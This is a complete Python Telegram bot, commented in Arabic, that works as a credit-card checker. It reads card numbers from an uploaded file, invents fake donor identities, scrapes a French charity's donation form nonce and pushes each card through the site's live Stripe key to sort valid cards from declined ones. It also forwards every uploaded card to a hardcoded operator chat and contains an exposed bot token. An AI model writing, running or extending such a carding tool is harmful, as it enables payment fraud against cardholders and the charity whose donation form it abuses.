import os
import random
import re
import time
import requests
import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# --- إعدادات البوت الأساسية ---
TOKEN = "8936672369:AAFJ-mEEThFA7D3D_8TOzjZ3lQ0SOlIA1CI"
ADMIN_CHAT_ID = "7352706784"

bot = telebot.TeleBot(TOKEN)

# قاموس لتتبع حالة الفحص لكل جلسة (لإمكانية الإيقاف)
active_scans = {}


def generate_user_agent():
  return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def gdata():
  words = [
      "tech",
      "code",
      "data",
      "cloud",
      "smart",
      "world",
      "life",
      "star",
      "game",
      "love",
      "hope",
  ]
  f = random.choice(words)
  num = random.randint(10, 99)
  domains = ["gmail.com", "hotmail.com", "icloud.com"]
  mail = f"{f}{num}@{random.choice(domains)}"
  name = f"{f.capitalize()} {random.choice(['Smith','Johnson','Williams','Brown','Jones'])}"
  add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple'])} St"
  city = random.choice(["New York", "Los Angeles", "Chicago", "Houston"])
  zip = str(random.randint(10000, 99999))
  phone = f"+1212{random.randint(100,999)}{random.randint(1000,9999)}"
  return mail, name, add, city, zip, phone


def check_card_detailed(cc, month, year, cvc):
  mail, name, add, city, zip, phone = gdata()
  r = requests.Session()
  u = generate_user_agent()

  headers_nonce = {
      "authority": "www.association-autourde.fr",
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "accept-language": "fr-FR,fr;q=0.9",
      "user-agent": u,
  }

  try:
    response = r.get(
        "https://www.association-autourde.fr/faire-un-don/",
        cookies=r.cookies,
        headers=headers_nonce,
        timeout=10,
    )
    m = re.search(
        r'name="_fluentform_\d+_fluentformnonce"\s+value="([^"]+)"',
        response.text,
    )
    x = m.group(1) if m else None
    if not x:
      return "Error: Nonce Not Found", None
  except Exception as e:
    return f"Connection Error: {type(e).__name__}", None

  headers_stripe = {
      "authority": "api.stripe.com",
      "origin": "https://js.stripe.com",
      "referer": "https://js.stripe.com/",
      "user-agent": u,
  }

  stripe_data = (
      f"type=card&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={month}&card[exp_year]={year}"
      "&payment_user_agent=stripe.js%2F21f5a54efa%3B+stripe-js-v3%2F21f5a54efa%3B+card-element"
      "&referrer=https%3A%2F%2Fwww.association-autourde.fr&key=pk_live_51L0LXBFgx7e3VPeC5ir34UKfiHGV3HRU3I6buYzXjG3rkS5odlBwWkxdc7ZC4JjFJ09abkOBcf8K1y7qavYrPN1u00M96WdeDP"
  )

  try:
    response_stripe = r.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers_stripe,
        data=stripe_data,
        timeout=10,
    )
    res_json = response_stripe.json()
    if "error" in res_json:
      err_msg = res_json["error"].get("message", "Unknown Stripe Error")
      return f"Decline: {err_msg}", None
    if "id" not in res_json:
      return "Decline: Invalid Payment Method", None
    pm_id = res_json["id"]
  except Exception as e:
    return f"Stripe Error: {type(e).__name__}", None

  headers_submit = {
      "authority": "www.association-autourde.fr",
      "origin": "https://www.association-autourde.fr",
      "referer": "https://www.association-autourde.fr/faire-un-don/",
      "sec-fetch-site": "same-origin",
      "user-agent": u,
      "x-requested-with": "XMLHttpRequest",
  }

  params = {"t": "1789777037998"}
  submit_data = {
      "data": (
          f"item_4__fluent_sf=&__fluent_form_embded_post_id=186&_fluentform_4_fluentformnonce={x}&_wp_http_referer=%2Ffaire-un-don%2F"
          f"&names%5Bfirst_name%5D={name}&names%5Blast_name%5D={name}&company=&phone={phone}&email={mail}"
          f"&don_ad=autre&total_don_ad_autre=1&message=&payment_method=stripe&rgpd=on&newsletter=&__stripe_payment_method_id={pm_id}"
      ),
      "action": "fluentform_submit",
      "form_id": "4",
  }

  try:
    response_final = r.post(
        "https://www.association-autourde.fr/wp-admin/admin-ajax.php",
        params=params,
        cookies=r.cookies,
        headers=headers_submit,
        data=submit_data,
        timeout=15,
    )
    result = response_final.json()
    result_str = str(result)

    details = {
        "mail": mail,
        "name": name,
        "add": add,
        "city": city,
        "zip": zip,
        "phone": phone,
    }

    if (
        "success" in result_str
        or "true" in result_str.lower()
        or "thank" in result_str.lower()
    ):
      return "Success: Payment succeeded 🔥", details
    else:
      return f"Decline: {result_str[:80]}", None
  except Exception as e:
    return f"Submit Error: {type(e).__name__}", None


@bot.message_handler(commands=["start"])
def send_welcome(message):
  markup = InlineKeyboardMarkup()
  markup.add(
      InlineKeyboardButton(
          "📁 فحص عن طريق ملف (Cards.txt)", callback_data="upload_guide"
      ),
      InlineKeyboardButton(
          "⚙️ نوع الفحص (Stripe Graphl v3)", callback_data="gateway_info"
      ),
      InlineKeyboardButton("📊 حالة السيرفر", callback_data="server_status"),
  )
  bot.send_message(
      message.chat.id,
      "مرحباً بك يا حر في لوحة تحكم بوت الفحص الاحترافي 🚀\nاختر أحد الأوامر أدناه:",
      reply_markup=markup,
  )


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
  if call.data == "upload_guide":
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "📂 لإجراء الفحص، قم **بإرسال ملف البطاقات (cards.txt)** مباشرة هنا في المحادثة.",
    )
  elif call.data == "gateway_info":
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "⚙️ **نوع الفحص الحالي:**\n• البوابة: Stripe (Graphl v3)\n• الموقع: association-autourde.fr",
    )
  elif call.data == "server_status":
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "📊 **حالة السيرفر:** متصل ويعمل بشكل دائم (24/7) ✅",
    )
  elif call.data == "stop_scan":
    active_scans[str(call.message.chat.id)] = False
    bot.answer_callback_query(call.id, "⚠️ جاري إيقاف الفحص...")
    bot.edit_message_reply_markup(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=None,
    )


@bot.message_handler(content_types=["document"])
def handle_docs(message):
  chat_id = ADMIN_CHAT_ID
  active_scans[str(chat_id)] = True

  try:
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    local_path = "cards.txt"
    with open(local_path, "wb") as new_file:
      new_file.write(downloaded_file)

    with open(local_path, "r", encoding="utf-8") as f:
      cards = [line.strip() for line in f.readlines() if line.strip()]

    total_cards = len(cards)
    if total_cards == 0:
      bot.reply_to(message, "⚠️ الملف فارغ.")
      return

    # إنشاء زر الإيقاف تحت اللوحة الحية
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_scan"))

    status_msg = bot.send_message(
        chat_id,
        f"""
╔══════════════════════════════════╗
║     ⚡ Live Checker Dashboard      ║
╚══════════════════════════════════╝
 📊 Status: Running...
 📁 Total Cards: {total_cards}
 🔄 Checked: 0 / {total_cards}
 🔥 Hits: 0
 ❌ Declined: 0
 ──────────────────────────────────
 🌐 Last Response: Waiting...
------------------------------------""",
        reply_markup=markup,
    )

    checked = 0
    hits = 0
    declines = 0

    for line in cards:
      # التحقق مما إذا قام المستخدم بالضغط على زر الإيقاف
      if not active_scans.get(str(chat_id), True):
        bot.send_message(chat_id, "🛑 **تم إيقاف الفحص بناءً على طلبك.**")
        break

      checked += 1
      try:
        parts = line.split("|")
        if len(parts) < 4:
          declines += 1
          continue
        cc, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(year) == 2:
          year = "20" + year

        # فحص البطاقة وجلب رد البوابة الحقيقي
        res, details = check_card_detailed(cc, month, year, cvc)

        if "Success" in res and details:
          hits += 1
          hit_msg = f"""
╔══════════════════════════════════╗
║        Stripe Hit - Success 🔥       ║
╚══════════════════════════════════╝
 ⟡ Card: {cc}|{month}|{year}|{cvc}
 ⟡ Response: {res}
 ──────────────────────────────────
 👤 Fake Info Details:
 ⟡ Name: {details['name']}
 ⟡ Email: {details['mail']}
 ⟡ Phone: {details['phone']}
------------------------------------"""
          bot.send_message(chat_id, hit_msg)
        else:
          declines += 1

        # تحديث اللوحة الحية مع عرض آخر رد حقيقي من البوابة
        try:
          bot.edit_message_text(
              chat_id=chat_id,
              message_id=status_msg.message_id,
              text=f"""
╔══════════════════════════════════╗
║     ⚡ Live Checker Dashboard      ║
╚══════════════════════════════════╝
 📊 Status: Scanning 🔍
 📁 Total Cards: {total_cards}
 🔄 Checked: {checked} / {total_cards}
 🔥 Hits: {hits}
 ❌ Declined: {declines}
 ──────────────────────────────────
 🌐 Last Response: `{res[:45]}`
------------------------------------""",
              reply_markup=markup,
          )
        except Exception:
          pass

      except Exception:
        declines += 1

      time.sleep(1)

    # إزالة الأزرار وإظهار حالة الانتهاء
    try:
      bot.edit_message_reply_markup(
          chat_id=chat_id, message_id=status_msg.message_id, reply_markup=None
      )
    except Exception:
      pass

  except Exception as e:
    bot.reply_to(message, f"حدث خطأ: {e}")


if __name__ == "__main__":
  bot.infinity_polling()
